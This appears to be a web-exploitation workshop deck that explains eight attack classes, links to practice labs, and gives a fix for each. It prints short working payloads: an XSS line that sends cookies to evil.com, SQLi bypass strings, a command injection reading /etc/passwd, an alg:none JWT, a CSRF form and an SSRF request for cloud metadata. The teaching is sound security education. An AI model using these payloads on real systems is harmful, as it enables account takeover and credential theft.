01 / INTRO
Why web exploitation?

Three generations, same battlefield.

From static pages to social apps to AI — the web has stayed the biggest attack surface.

Massive scale

~1.49 billion websites exist. ~217 million active. An estimated 30,000 get hacked every day.

Many motives, one door

Hacktivists, ransomware groups, and attention seekers all come in through the web — the widest door there is.

Always relevant

Unsupervised vibe-coding made an ever bigger attack surface. The fundamentals stay the same.

02 / INTRO
Its relevance

Your starting point.

  • Entry point: to get your way into any system, web exploitation will be your starting point.
  • Bug bounty: web exploitation is the lowest barrier to get paid — most programs are web-focused.
  • Relevant then, even more now: unsupervised vibe-coding made an ever bigger attacking surface.

    • Key idea: understanding attacker behavior helps build stronger defenses. Every bug today comes from trusting input the user controls.

    06 / FUNDAMENTALS
    Fundamentals

    Client-side vs server-side.

    Client Side

    Everything that runs in the user's browser on their device.

    • HTML, CSS, JavaScript
    • Handles UI & interactions
    • Instant feedback for the user

    Server Side

    Everything that runs on the server, behind the scenes.

    • Server logic, APIs, databases
    • Handles security & data processing
    • Stores, updates & manages data
    BrowserCLIENT
    ServerLOGIC
    DatabaseSTORAGE

    Request in → logic runs → response out. Every vulnerability lives somewhere on this path.

    07 / FUNDAMENTALS
    Perspective

    Black box vs white box.

    Black box

    We don't know anything. No source, no docs — just the live app as a user sees it.

    White box

    We know everything. Source code, configs, architecture — we can trace every input.

    QA testers usually sit between them — gray box: partial knowledge, good for realistic testing.

    09 / FUNDAMENTALS
    Sessions

    How cookies work.

    A cookie is a note the server asks your browser to keep — and hand back on every request. This is why IDOR and XSS-cookie-theft exist.

    BrowserYOU
    ServerAPP

    1. Log in → 2. Server creates session → 3. Set-Cookie header → 4. Browser stores → 5. Sent automatically on every request

    Set-Cookie: session_id=8f2a91c4; HttpOnly; Secure

    HttpOnly means client-side JavaScript can never read the cookie — a direct defense against cookie theft via XSS. No ownership check on the server side is exactly how IDOR slips through.

    10 / FUNDAMENTALS
    Network

    The firewall.

    A firewall sits between the public internet and a private network. It blocks bad traffic — but SSRF bypasses it because the request comes from inside.

    InternetPUBLIC
    FirewallCHECK
    Private networkINTERNAL

    Good traffic passes. SSRF makes the server itself the source — so it walks straight through.

    11 / TOOLS
    Tools to use

    Your kit.

    Browser DevTools

    The browser, opened up. Shows every request the page sends and lets you edit live: cookies, HTML, JavaScript. Zero-install starting point.

    cURL

    Send one request from the command line. You write method, headers, cookies, body — and see the raw response. Fast, scriptable, no browser.

    Burp Suite

    A middleman between browser and server. Pause any request, edit it, replay it as many times as you like. Standard tool for web testing and bug bounty.

    curl -X POST https://target/login -d "user=admin&pass=admin" -H "Cookie: session=abc"

    Section 01
    INJECTIONS

    Untrusted input reaches an interpreter — a database, a shell, or the browser — and changes what it does.

    XSS SQLi CMDi
    INJECTIONS · 01
    XSS · Where & impact

    Cross-Site Scripting.

    Reflected

    Fires once via a crafted link. Input is echoed back immediately.

    Stored

    Saved on the server, fires for every visitor. Most dangerous.

    DOM-based

    Entirely client-side JavaScript mistake — never touches the server.

    WHERE IT'S FOUND

    • Comment fields, profile names, search boxes — anything echoed back.
    • URL parameters rendered into the page without encoding.
    • Anywhere user input lands in HTML/JS context unescaped.

    IMPACT

    • Session hijacking via cookie theft · account takeover
    • Defacement · phishing · keylogging in the victim's browser
    • Actions performed as the victim — CSRF-like behavior
    INJECTIONS · 01
    XSS · How it works

    The attack flow.

    AttackerPAYLOAD
    ServerSTORES
    VictimBROWSING

    1. Attacker injects <script> → 2. Server stores it raw → 3. Victim loads the page → 4. Script runs in victim's browser → 5. Cookie stolen

    <script>document.location='evil.com/steal?c='+document.cookie</script>

    Why it works: the server echoes input without encoding it. The browser has no way to tell this script from the site's own code — so it runs with full trust.

    INJECTIONS · 01
    Hands-on lab

    Break XSS.

    Find a field that's echoed back, inject a script, and confirm it fires. Then fix it with output encoding.

    INJECTIONS · 02
    SQL Injection · Where & impact

    SQL Injection.

    Untrusted input reaches a database query unescaped — letting an attacker change what the query actually does.

    WHERE IT'S FOUND

    • Login forms, search boxes, URL filters — any input used in a query.
    • Numeric and string parameters alike, including hidden form fields.
    • Behind APIs where the app builds SQL by string concatenation.

    IMPACT

    • Authentication bypass — log in as admin with ' OR '1'='1
    • Full database dump — usernames, password hashes, PII
    • Data modification or deletion — sometimes RCE via INTO OUTFILE
    INJECTIONS · 02
    SQL Injection · How it works

    The query break.

    AttackerINPUT
    ServerCONCAT
    DatabaseEXECUTES

    1. Attacker submits ' OR '1'='1' -- → 2. Server glues input into query → 3. DB sees valid SQL → 4. WHERE is always true → 5. All rows returned

    SELECT * FROM users WHERE name='' OR '1'='1' --'

    Why it works: the quote closes the string literal early. Everything after becomes real SQL, and -- comments out the rest. One character bypassed the login system.

    INJECTIONS · 02
    Hands-on lab

    Break SQLi.

    Bypass login with ' OR '1'='1, then fix it with parameterized queries.

    Open SQLi Lab
    https://rayen-mansouri.github.io/web_workshop/sqli_lab.html
    INJECTIONS · 03
    Command Injection · Where & impact

    Command Injection.

    User input flows into a system command — like ping, nslookup, or a file convert — and the shell executes whatever the attacker appends.

    WHERE IT'S FOUND

    • Diagnostic tools — ping, traceroute, DNS lookup from the UI.
    • File converters, image processors, PDF generators.
    • Backup / export features that shell out to system commands.

    IMPACT

    • Full server compromise — read files, run processes, pivot.
    • Often the highest-severity bug you can find — RCE.
    • Chained with SSRF or uploads, it's game over for the host.
    INJECTIONS · 03
    Command Injection · How it works

    The shell break.

    AttackerINPUT
    ServerSHELLS OUT
    OS ShellEXECUTES

    1. Input 127.0.0.1; cat /etc/passwd → 2. Server builds a shell command → 3. Semicolon chains a second command → 4. Output returned to attacker

    ping -c 1 127.0.0.1; cat /etc/passwd

    Why it works: the app calls system(), exec(), or shell_exec() with user input. Shell metacharacters (; | && $()) chain extra commands. The OS runs them with the web server's privileges.

    INJECTIONS · 03
    Hands-on lab

    Break CMDi.

    Chain a command with ;, then fix it by avoiding the shell entirely.

    Open CMDi Lab
    https://rayen-mansouri.github.io/web_workshop/cmdi_lab.html
    Section 02
    BROKEN TRUST

    The app trusts something it shouldn't — an ID, a token, or a login with no rate limit.

    IDOR JWT Brute-force
    BROKEN TRUST · 01
    IDOR · Where & impact

    Insecure Direct Object References.

    The app exposes an internal ID and lets you swap it to access another user's object — without checking you own it.

    WHERE IT'S FOUND

    • URLs like /invoice/1001 or /user/42
    • API calls with sequential IDs in body or query params.
    • Hidden form fields carrying the object ID.

    IMPACT

    • Read other users' invoices, orders, messages, PII.
    • Modify or delete another account's data.
    • A broken access control bug — not code execution, but often critical.
    BROKEN TRUST · 01
    IDOR · How it works

    The ID swap.

    YouSESSION B
    ServerAUTH ONLY
    User A's DataINVOICE #1042

    1. You request /invoices/1001 (yours) → 2. Server checks login only → 3. You change to /invoices/1002 → 4. Server returns User A's data → 5. No ownership check

    GET /invoices/1002 ← one digit changed

    Why it works: the server fetches whatever ID is in the URL. It checks that you're logged in — but never that invoice 1002 actually belongs to you. Multiply by every ID and the whole table is exposed.

    BROKEN TRUST · 01
    Hands-on lab

    Break IDOR.

    Create two test accounts, swap an ID, then fix it with an ownership check.

    Open IDOR Lab
    https://rayen-mansouri.github.io/web_workshop/idor_lab.html
    BROKEN TRUST · 02
    JWT Attacks · Where & impact

    JSON Web Token attacks.

    JWTs carry identity in three base64 parts: header.payload.signature. If the signature is weak, missing, or checked badly, you can edit the payload — like "role":"admin" — and the server believes it.

    WHERE IT'S FOUND

    • alg: none — server accepts unsigned tokens.
    • Weak HMAC secret — brute-force the signing key.
    • Algorithm confusion — RSA public key used as HMAC secret.

    IMPACT

    • Privilege escalation — become admin by editing one claim.
    • Account takeover — forge tokens for any user ID.
    • Bypass auth entirely if none is accepted.
    BROKEN TRUST · 02
    JWT Attacks · How it works

    The forged token.

    eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.(empty signature)
    header · payload · signature
    AttackerEDIT
    ServerTRUSTS SIG

    1. Attacker captures JWT → 2. Decodes payload → 3. Changes role:user to role:admin → 4. Sets header alg:none → 5. Server accepts — no signature check

    Why it works: the client controls every byte of the JWT. If the server doesn't strictly verify the signature (or accepts none), the payload is just base64 — editable in a browser.

    BROKEN TRUST · 02
    Hands-on lab

    Break JWT.

    Set alg:none, edit the payload, then fix it by enforcing strict signature verification.

    Open JWT Lab

    BROKEN TRUST · 03
    Brute-force & Fuzzing · Where & impact

    Brute-force attacks.

    An attacker automates login attempts — guessing passwords, stuffing leaked credentials, or spraying common ones — because nothing stops the volume.

    WHERE IT'S FOUND

    • Login forms without rate-limiting or account lockout.
    • Password reset endpoints with guessable tokens.
    • API auth with no CAPTCHA or MFA.

    IMPACT

    • Account takeover at scale — no exploit needed beyond patience.
    • Credential stuffing spreads across sites (people reuse passwords).
    • With leaked wordlists, success is often just a matter of time.
    BROKEN TRUST · 03
    Brute-force · How it works

    The number game.

    ToolWORDLIST
    ServerNO LIMIT

    1. Load a wordlist → 2. Try #1 → 3. Rejected, no delay → 4. Try #2,847 → 5. Correct password found

    Why it works: with no rate-limiting or lockout, the server happily accepts thousands of guesses per second. A CAPTCHA once per failure — or MFA — breaks the loop instantly.

    BROKEN TRUST · 03
    Hands-on lab

    Break Brute-force.

    Run a small wordlist against the login, then fix it with rate-limiting, lockout, and MFA.

    Open Brute-force Lab
    https://rayen-mansouri.github.io/web_workshop/bruteforce_lab.html
    Section 03
    ABUSE OF AUTHORITY

    The browser or server has authority — and an attacker makes it act against the user's interest.

    CSRF SSRF
    ABUSE · 01
    CSRF · Where & impact

    Cross-Site Request Forgery.

    The victim's browser is tricked into sending an authenticated request to a site where they're logged in. The server sees a valid session cookie — and does what the request says.

    WHERE IT'S FOUND

    • State-changing actions with no CSRF token — transfer money, change email, delete account.
    • Cookie-based auth with SameSite=None or no SameSite at all.
    • GET requests that mutate data (the worst offender).

    IMPACT

    • Unauthorized actions performed as the victim — money transfers, email changes, posts.
    • Account lockout / takeover via email or password change.
    • Chained with XSS or stored data, it becomes stealthy and viral.
    ABUSE · 01
    CSRF · How it works

    The forged request.

    Attacker siteEVIL.COM
    VictimBROWSER
    BankCOOKIE VALID

    1. Victim visits evil.com while logged into bank → 2. Evil page auto-submits a hidden form → 3. Browser attaches bank cookie → 4. Bank sees valid session → 5. Transfer happens

    <form action="bank.com/transfer" method="POST"><input name="to" value="evil">...auto-submit

    Why it works: the browser automatically attaches cookies to any request to the target site — regardless of which page caused it. The server can't tell the difference between a real transfer and this forged one unless it checks a CSRF token.

    ABUSE · 01
    Hands-on lab

    Break CSRF.

    Host a hidden form, make a logged-in victim load it, then fix it with CSRF tokens and SameSite cookies.

    Open CSRF Lab
    https://rayen-mansouri.github.io/web_workshop/csrf_lab.html
    ABUSE · 02
    SSRF · Where & impact

    Server-Side Request Forgery.

    The app fetches a URL on the attacker's behalf — the attacker makes the server issue the request, not the browser.

    WHERE IT'S FOUND

    • URL-fetching features — image/avatar import, PDF generation, webhook testers.
    • URL previews in chat apps — Slack, Discord, Telegram.
    • Any parameter that takes a URL and the server requests it.

    IMPACT

    • Reach internal services the attacker can't touch — admin panels, DBs.
    • Cloud metadata theft — 169.254.169.254 — often yields credentials.
    • Port scanning the internal network, pivot to other hosts.
    ABUSE · 02
    SSRF · How it works

    The inside job.

    AttackerURL
    ServerFETCHES
    InternalMETADATA

    1. Attacker sets URL to http://169.254.169.254/ → 2. Server fetches it → 3. Firewall sees traffic from server, allows → 4. Metadata answers → 5. Credentials leaked

    POST /fetch { url: "http://169.254.169.254/latest/meta-data/" }

    Why it works: the request is made from the server itself — so it sails straight past firewalls that only block outside traffic. Internal services assume the request is legitimate because it came from inside.

    ABUSE · 02
    Hands-on lab

    Break SSRF.

    Point a fetch feature at an internal address, then fix it with an allow-list and IP validation.

    Open SSRF Lab
    https://rayen-mansouri.github.io/web_workshop/ssrf_lab.html
